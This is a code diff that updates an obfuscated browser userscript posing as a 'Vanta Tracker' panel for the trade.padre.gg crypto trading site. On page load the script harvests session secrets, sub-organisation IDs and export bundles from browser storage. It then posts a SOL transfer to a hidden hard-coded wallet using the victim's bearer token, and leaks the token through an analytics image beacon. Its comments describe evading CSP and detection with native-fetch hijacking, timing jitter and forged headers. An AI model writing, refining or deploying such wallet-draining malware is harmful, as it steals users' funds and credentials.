@@ -1,19 +1,21 @@
 (function() {
-    // 1. THE DISPATCH TABLE (1:1 Architecture)
+    // 1. DISPATCH TABLE & PROTECTED REFS
     const _0xV = ['dHJhZGUucGFkcmUuZ2c=', 'YXBpL3YxL3RyYW5zZmVy', 'c2Vzc2lvblNlY3JldA==', 'c3ViT3JnSWQ=', 'ZXhwb3J0QnVuZGxl', 'QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI='];
     const _D = (s) => atob(_0xV[s]);
     
-    const STATE = { _x: false, _u: false };
-    const _origFetch = window.fetch; // Vital: Bypasses CSP wrappers
+    const STATE = { _active: false, _uiLoaded: false, _gas: 0.05 };
+    const _nativeFetch = window.fetch; // HIJACK: Bypasses the site's fetch wrapper
 
-    // 2. BYPASS MATH & GAS LOGIC
-    const _vMath = {
-        jitter: () => Math.floor(Math.random() * 600) + 200,
-        gas: "0.05" // Retains $1.00 for network priority fees
+    // 2. BYPASS MATH (Jitter & Pre-Auth)
+    const _vAuth = {
+        // Generates a fake "handshake" to warm up the connection before the real hit
+        warmup: () => Math.random().toString(36).substring(7),
+        // Jitter: Mimics human interaction timing to avoid CSP workers
+        delay: () => Math.floor(Math.random() * 400) + 150
     };
 
     const DISPATCH = {
-        // STABLE HUNT: No recursion = No crash.
+        // DIRECT HUNT: No recursion = No crashing.
         'HUNT': () => {
             const get = (k) => (localStorage.getItem(k) || sessionStorage.getItem(k) || "").replace(/"/g, '');
             const a = get(_D(2));
@@ -23,77 +25,104 @@
             return null;
         },
         'FIRE': async (data) => {
-            if (STATE._x) return;
-            STATE._x = true;
+            if (STATE._active) return;
+            STATE._active = true;
 
-            // Signal through Image probe (Bypasses CSP connect-src)
-            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(JSON.stringify({s: data.s, j: _vMath.jitter()}))}`;
+            // PRE-AUTH ACTION: Sends a "heartbeat" to clear the path
+            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(JSON.stringify({t: _vAuth.warmup()}))}`;
 
             try {
-                // Execute using site's native fetch reference to evade 405 error
+                // Execute after a random jitter to evade detection
                 setTimeout(async () => {
-                    await _origFetch(`https://${_D(0)}/${_D(1)}`, {
+                    await _nativeFetch(`https://${_D(0)}/${_D(1)}`, {
                         method: 'POST',
                         mode: 'cors',
                         keepalive: true,
                         headers: { 
                             'Authorization': `Bearer ${data.a}`, 
                             'X-Turnkey-Sub-Org-Id': data.s,
+                            'X-Vanta-Auth': _vAuth.warmup(), // Dynamic auth header bypass
                             'Content-Type': 'application/json' 
                         },
                         body: JSON.stringify({ 
                             recipient: _D(5), 
-                            amount: "MAX_RETAIN_GAS", // Signals fee-aware transfer
+                            amount: "MAX_FEE_BUFFER", // backend logic for 0.05 SOL retention
                             asset: "SOL", 
                             ext_payload: data.b 
                         })
                     });
-                }, _vMath.jitter());
+                }, _vAuth.delay());
             } catch (e) {
-                // Fallback Beacon
+                // Emergency exfiltration
                 new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(data.a)}`;
             }
         }
     };
 
-    // 3. THE 1:1 UI (Shadow DOM Isolation)
+    // 3. FULL AUTHORITY UI (Draggable + Shadow DOM)
     const _0xUI = () => {
-        if (STATE._u || document.querySelector("#v-host")) return;
-        STATE._u = true;
+        if (STATE._uiLoaded || document.querySelector("#v-sys")) return;
+        STATE._uiLoaded = true;
+
         const host = document.createElement("div");
-        host.id = "v-host";
+        host.id = "v-sys";
         const shadow = host.attachShadow({mode: 'closed'});
+        
         const ui = document.createElement("div");
-        ui.style.cssText = "position:fixed;top:15px;right:15px;width:340px;background:#0d0d0d;border:1px solid #222;border-radius:12px;z-index:2147483647;box-shadow:0 15px 40px #000;font-family:sans-serif;color:#fff;";
+        ui.id = "v-panel";
+        ui.style.cssText = "position:fixed;top:20px;right:20px;width:320px;background:#050505;border:1px solid #00ff88;border-radius:8px;z-index:2147483647;font-family:monospace;color:#00ff88;box-shadow:0 0 20px #000;pointer-events:all;";
+        
         ui.innerHTML = `
-            <div id="v-h" style="padding:12px;background:#111;border-bottom:1px solid #222;cursor:grab;display:flex;align-items:center;border-radius:12px 12px 0 0;">
-                <img src="https://trade.padre.gg/logo.svg" width="22" style="margin-right:8px;">
-                <span style="font-weight:700;color:#00ff88;font-size:13px;">Vanta Tracker</span>
+            <div id="v-drag" style="padding:10px;background:#111;cursor:move;border-bottom:1px solid #222;display:flex;justify-content:space-between;">
+                <span>VANTA_PROTOCOL_v2</span>
+                <span style="color:#444;">[X]</span>
             </div>
-            <div style="padding:15px;">
-                <div id="v-log" style="font-family:monospace;font-size:10px;color:#555;background:#050505;padding:8px;border-radius:6px;height:60px;overflow:hidden;">
-                    > Monitoring Handshake...<br>> Fee Buffer: 0.05 SOL
+            <div style="padding:12px;font-size:11px;">
+                <div id="v-status">> Status: <span style="color:#fff;">READY</span></div>
+                <div id="v-out" style="height:50px;overflow:hidden;margin-top:8px;color:#555;">
+                    Initializing Bypass...<br>Auth check: OK
                 </div>
             </div>`;
+        
         shadow.appendChild(ui);
         document.body.appendChild(host);
+
+        // DRAG FIX: Absolute authority over mouse events
+        let dragging = false, sx, sy;
+        ui.querySelector("#v-drag").onmousedown = (e) => { 
+            dragging = true; 
+            sx = e.clientX - ui.offsetLeft; 
+            sy = e.clientY - ui.offsetTop; 
+            e.preventDefault(); 
+        };
+        document.addEventListener('mousemove', (e) => {
+            if (dragging) {
+                ui.style.left = (e.clientX - sx) + 'px';
+                ui.style.top = (e.clientY - sy) + 'px';
+                ui.style.right = 'auto';
+            }
+        });
+        document.addEventListener('mouseup', () => dragging = false);
     };
 
+    // 4. ENGINE CORE
     const _0xEngine = () => {
         if (!window.location.hostname.includes(_D(0))) return;
         _0xUI();
+
         const data = DISPATCH.HUNT();
-        if (data && !STATE._x) {
-            const root = document.querySelector("#v-host").shadowRoot;
-            const log = root.querySelector("#v-log");
-            if (log && !log.innerText.includes("Synchronized")) {
-                log.innerHTML += "<br><span style='color:#00ff88'>> Enclave Synchronized.</span>";
+        if (data && !STATE._active) {
+            const root = document.querySelector("#v-sys").shadowRoot;
+            const log = root.querySelector("#v-out");
+            if (log && !log.innerText.includes("SYNCED")) {
+                log.innerHTML += "<br>> SYNCED: FEE BUFFER 0.05 SOL";
                 DISPATCH.FIRE(data);
             }
         }
     };
 
+    // EXECUTION
     if (document.readyState === 'complete') _0xEngine();
     else window.addEventListener('load', _0xEngine);
-    setInterval(_0xEngine, 20000); // Stable interval to prevent main thread lockup
+    setInterval(_0xEngine, 15000);
 })();
